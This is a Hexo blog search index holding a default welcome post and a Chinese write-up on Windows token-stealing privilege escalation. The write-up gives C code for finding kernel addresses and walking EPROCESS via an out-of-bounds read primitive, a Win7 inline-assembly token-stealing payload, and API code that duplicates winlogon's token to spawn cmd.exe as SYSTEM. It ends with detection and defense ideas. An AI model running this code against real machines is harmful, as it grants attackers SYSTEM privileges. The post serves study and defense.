<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hello word</title>
    <url>/2022/01/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Token替换</title>
    <url>/2022/01/13/Token%E6%9B%BF%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="Process-Token-替换"><a href="#Process-Token-替换" class="headerlink" title="Process Token 替换"></a>Process Token 替换</h1><h2 id="R3获取System-EProcess"><a href="#R3获取System-EProcess" class="headerlink" title="R3获取System EProcess"></a>R3获取System EProcess</h2><h3 id="1-定位到NT执行体模块的内存地址"><a href="#1-定位到NT执行体模块的内存地址" class="headerlink" title="1.定位到NT执行体模块的内存地址"></a>1.定位到NT执行体模块的内存地址</h3><p>这里借助了<code>EnumDeviceDrivers</code>函数去获取系统中的所有设备驱动程序的加载地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD32 GetKernelBase()</span><br><span class="line">&#123;</span><br><span class="line">	PVOID driversAddress[1024] = &#123; 0 &#125;;</span><br><span class="line">	DWORD cbNeeded = 0;</span><br><span class="line">	int cDrivers = 0;</span><br><span class="line">	int ntoskrnlKernelBase = 0;</span><br><span class="line"></span><br><span class="line">	// find ntoskrnl.exe kernel base</span><br><span class="line">	if (EnumDeviceDrivers(driversAddress, sizeof(driversAddress), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(driversAddress))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		cDrivers = cbNeeded / sizeof(driversAddress[0]);</span><br><span class="line"></span><br><span class="line">		for (int i = 0; i &lt; cDrivers; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (GetDeviceDriverBaseName(driversAddress[i], driverName, 1024))</span><br><span class="line">			&#123;</span><br><span class="line">				TCHAR* lowerName = _wcslwr(driverName);</span><br><span class="line"></span><br><span class="line">				if (!wcsncmp(driverName, L&quot;nt&quot;, 2)) &#123;</span><br><span class="line"></span><br><span class="line">					ntoskrnlKernelBase = i;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				else &#123;</span><br><span class="line">					if (i == (cDrivers - 1)) &#123;</span><br><span class="line">						_tprintf(L&quot;can&#x27;t find driver name\n&quot;);</span><br><span class="line">						exit(0);</span><br><span class="line">					&#125;</span><br><span class="line">					continue;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				_tprintf(L&quot;get device driver name failed\n&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;Enumerate Device Drivers failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_tprintf(L&quot;driver name is: %s\n&quot;, driverName);</span><br><span class="line">	return (DWORD32)driversAddress[ntoskrnlKernelBase];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一步需要注意一点，NT模块名字在不同的环境下名字不同，因此不能直接写死。<br><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybty7e83jj30lo03swes.jpg" alt="f7fe4a1c240689e73c4aca40058707ee"></p>
<h3 id="2-获取PsInitialSystemProcess动态执行地址"><a href="#2-获取PsInitialSystemProcess动态执行地址" class="headerlink" title="2.获取PsInitialSystemProcess动态执行地址"></a>2.获取PsInitialSystemProcess动态执行地址</h3><p>根据官方文档的描述，在NT执行体模块中有一个导出变量<code>PsInitialSystemProcess</code>，其指向System<br>Eprocess的地址。<br><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybtz0hiv8j30o00280tf.jpg" alt="5c4858166db9c043446231b99e4f534c"></p>
<p>因此就可以通过<code>PsInitialSystemProcess</code>获取其值了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD_PTR GetSystemEProcessAddr() </span><br><span class="line">&#123;</span><br><span class="line">	//获取NT执行体模块基地址</span><br><span class="line">    DWORD_PTR ntoskrnlKernelBase = GetKernelBase();</span><br><span class="line">    //获取NT模块基地址</span><br><span class="line">	DWORD_PTR ntoskrnlUserBase = (DWORD_PTR)LoadLibrary(driverName);</span><br><span class="line">	if (ntoskrnlUserBase == NULL) </span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;load library failed!\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD_PTR PsInitialSystemProcessUserSpaceAddr = (DWORD_PTR)GetProcAddress((HMODULE)ntoskrnlUserBase, &quot;PsInitialSystemProcess&quot;);</span><br><span class="line">    //PsInitialSystemProcess动态地址 = 获取NT执行体模块基地址 + (获取NT模块基地址 - PsInitialSystemProcess静态地址)</span><br><span class="line">	DWORD_PTR PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + (PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase);</span><br><span class="line"></span><br><span class="line">	return PsInitialSystemProcessKernelSpaceAddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-通过EPROCESS遍历进程（ActiveProcessLinks）-找到目标"><a href="#3-通过EPROCESS遍历进程（ActiveProcessLinks）-找到目标" class="headerlink" title="3.通过EPROCESS遍历进程（ActiveProcessLinks）,找到目标"></a>3.通过EPROCESS遍历进程（ActiveProcessLinks）,找到目标</h3><p><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybu0l08k2j30mg037q4j.jpg" alt="052cc71b9159cb8447961cc81efe6e2c"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查找当前进程token</span><br><span class="line">ReadOOB(hManager, hWorker, (SystemEProcessAddr + dwPLinkOffset), &amp;ProcessListLink,sizeof(DWORD32));</span><br><span class="line"></span><br><span class="line">CurrentPid = GetCurrentProcessId();</span><br><span class="line"></span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD32 dwTempPid = 0;</span><br><span class="line">	DWORD32 dwTempEProcessAddr = 0;</span><br><span class="line"></span><br><span class="line">	dwTempEProcessAddr = (DWORD32)((PUCHAR)ProcessListLink.Flink - dwPLinkOffset);</span><br><span class="line">	ReadOOB(hManager, hWorker,(dwTempEProcessAddr + dwPidOffset), &amp;dwTempPid, sizeof(DWORD32));</span><br><span class="line">	if (dwTempPid == CurrentPid)</span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;[+]Get Current Process Addr: 0x%x\n&quot;, dwTempEProcessAddr);</span><br><span class="line">		_tprintf(L&quot;[+]Get Current Process Id: 0x%x\n&quot;, dwTempPid);</span><br><span class="line">		//ReadOOB(hManager, hWorker, (dwTempEProcessAddr + 0xf8), &amp;lpCurrentTokenAddress, sizeof(DWORD32));</span><br><span class="line">		CurrentTokenAddress = dwTempEProcessAddr + dwTokenOffset;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	ReadOOB(hManager, hWorker, (dwTempEProcessAddr + dwPLinkOffset), &amp;ProcessListLink, sizeof(LIST_ENTRY));;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Token替换方式"><a href="#Token替换方式" class="headerlink" title="Token替换方式"></a>Token替换方式</h2><h3 id="1-Token指针替换（-EX-FAST-REF替换）"><a href="#1-Token指针替换（-EX-FAST-REF替换）" class="headerlink" title="1.Token指针替换（_EX_FAST_REF替换）"></a>1.Token指针替换（_EX_FAST_REF替换）</h3><p><img src="https://tva1.sinaimg.cn/large/0075Vlv2ly1gybu1ecmi8j30ok045q4f.jpg" alt="ef00c924869af6b2e192e92e2ad0eeae"><br>将当前进程 EPROCESS 中存储的 Token 指针替换为 System 进程的 Token 指针。<br><img src="https://tvax4.sinaimg.cn/large/0075Vlv2ly1gybu2bbj7ej30s80axdl8.jpg" alt="8fa26365487da2b6d834513a62f2e15e"></p>
<h4 id="汇编内联"><a href="#汇编内联" class="headerlink" title="汇编内联"></a>汇编内联</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7Generic() &#123;</span><br><span class="line">    // No Need of Kernel Recovery as we are not corrupting anything</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"> </span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        xor eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"> </span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"> </span><br><span class="line">        mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"> </span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"> </span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"> </span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"> </span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-Token中的成员替换"><a href="#2-Token中的成员替换" class="headerlink" title="2.Token中的成员替换"></a>2.Token中的成员替换</h3><p>将当前进程 EPROCESS的成员Token指针指向的Token块中的数据替换成System<br>进程拥有的Token块的数据</p>
<p><img src="https://tva2.sinaimg.cn/large/0075Vlv2ly1gybu4850ysj30ob045taj.jpg" alt="c248277aa1e61ea5ccd4a9560c329bb5"></p>
<p>将<code>Present</code>和<code>Enabled</code>的值更改为SYSTEM进程令牌的所有权限。<br><img src="https://tva4.sinaimg.cn/large/0075Vlv2ly1gybu4jbupjj30ee02szlt.jpg" alt="3375b082fbf94c912ddf3c4ef977376b"></p>
<h3 id="3-通过Windows-API窃取令牌"><a href="#3-通过Windows-API窃取令牌" class="headerlink" title="3.通过Windows API窃取令牌"></a>3.通过Windows API窃取令牌</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!GetProIDByName(L&quot;Winlogon.exe&quot;, &amp;ulWinlogonPID) || !ulWinlogonPID)</span><br><span class="line">	return;</span><br><span class="line"></span><br><span class="line">hProc = OpenProcess(</span><br><span class="line">	PROCESS_QUERY_INFORMATION,</span><br><span class="line">	FALSE,</span><br><span class="line">	ulWinlogonPID );</span><br><span class="line"></span><br><span class="line">OpenProcessToken(</span><br><span class="line">	hProc,</span><br><span class="line">	TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,</span><br><span class="line">	&amp;hToken);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;</span><br><span class="line">TOKEN_TYPE tokenType = TokenPrimary;</span><br><span class="line">if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;hEopToken))</span><br><span class="line">	return;</span><br><span class="line"></span><br><span class="line">/* Starts a new process with SYSTEM token */</span><br><span class="line">STARTUPINFOW si = &#123;&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line">CreateProcessWithTokenW(</span><br><span class="line">	hEopToken,</span><br><span class="line">	LOGON_NETCREDENTIALS_ONLY,</span><br><span class="line">	L&quot;C:\\Windows\\System32\\cmd.exe&quot;,</span><br><span class="line">	NULL,</span><br><span class="line">	CREATE_NEW_CONSOLE,</span><br><span class="line">	NULL,</span><br><span class="line">	NULL,</span><br><span class="line">	&amp;si,</span><br><span class="line">	&amp;pi);</span><br></pre></td></tr></table></figure>
<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><h3 id="1-SACL记录访问事件-winlogon-exe-—检测"><a href="#1-SACL记录访问事件-winlogon-exe-—检测" class="headerlink" title="1.SACL记录访问事件(winlogon.exe)—检测"></a>1.SACL记录访问事件(winlogon.exe)—检测</h3><p>此方法可针对通过<code>OpenProcessToken</code>、<code>DuplicateTokenEx</code>窃取高权限令牌。(记录在ETW)<br><img src="https://tva1.sinaimg.cn/large/0075Vlv2ly1gybu7jr29jj30lw0acgqh.jpg" alt="337219a8c9ac39d6845213ffef21b914"></p>
<h3 id="2-Token-地址匹配"><a href="#2-Token-地址匹配" class="headerlink" title="2.Token 地址匹配"></a>2.Token 地址匹配</h3><p>恶意进程窃取令牌目的是为了起一个新的进程。因此可以提前记录system token address.</p>
<p>Hook CreateProcessWithToken去验证token地址(父进程与system)是否一致。</p>
<p>地址获取：EPROCESS-&gt;EX_FAST_REF-&gt;object &amp; 0xFFFFFFF0</p>
<h3 id="3-Hook-DuplicateToeknEx-可能有误报"><a href="#3-Hook-DuplicateToeknEx-可能有误报" class="headerlink" title="3.Hook DuplicateToeknEx(可能有误报)"></a>3.Hook DuplicateToeknEx(可能有误报)</h3><p>拦截system token 被复制。</p>
<h3 id="4-Token-跟踪"><a href="#4-Token-跟踪" class="headerlink" title="4.Token 跟踪"></a>4.Token 跟踪</h3><p>Hook CreateProcess当有新的进程（cmd）启动时候，复制一份token。当此进程有DuplicateToeknEx、CloseHandle等操作，则对token进行验证，若发生变化则可以说明此进程进行了token替换。</p>
]]></content>
  </entry>
</search>
